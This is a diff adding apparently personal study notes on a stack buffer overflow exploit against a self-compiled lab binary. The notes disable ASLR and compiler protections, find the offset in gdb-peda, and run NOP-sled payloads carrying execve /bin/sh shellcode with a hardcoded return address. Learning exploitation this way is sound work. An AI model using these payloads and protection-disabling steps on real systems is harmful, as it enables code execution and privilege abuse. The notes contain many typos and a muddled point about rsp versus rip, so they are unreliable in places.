@@ -1,0 +1,52 @@
+chmod 4755 <file>
+
+
+most modern OS have measures to prevent buffer overflow:
+
+(1) SLR - address space layout randomization
+(memory protection method guards against BO by randomizing the location where executables are loaded)
+
+disable by:
+$ sudo sysctl -w kernel.randomize_va_space=0
+(0-no randomization; 2-full rand)
+see default:
+sysctl -a --pattern "randomize" (2 is default)
+
+strcpy instead of strincpy doesn't check bufer ovrflow
+
+usual compile:
+gcc -o vuln vuln.c
+
+if stack smash detected - canary, nx, pie are enabled
+(there is nothing to do but rebuild bin)
+
+gdb-pega$ checksec	to check seurity
+
+disable bin protecton:
+$ gcc -fno-stack-protector -z execstack -no-pie -o vuln2 vuln.c
+
+main goal is rewrite rsp (not rip) that will be copied into rip?
+
+
+length find:
+gdb-pega$ pattern_create 550 pat	pat is file to stoe pattern
+run programm usng that pattern:
+gdb-pega$ run $(cat pat)		pattern is unic
+gdb-pega$ pattern_search		to get the offset
+shoul be something like:
+[RSP] --> offset 520 - size ~30
+
+shellode at ./shellcode.txt
+
+no op sleg:
+r $(python2 -c 'print "\x90"*450+"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"+"\x41"*6')
+
+
+
+
+Find return address:
+x/200x $rsp
+jump into the middle of x90
+run $(python2 -c 'print "\x90"*450+"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"+"\x41"*43+"\x50\xe6\xff\xff\xff\x7f"')
+
+
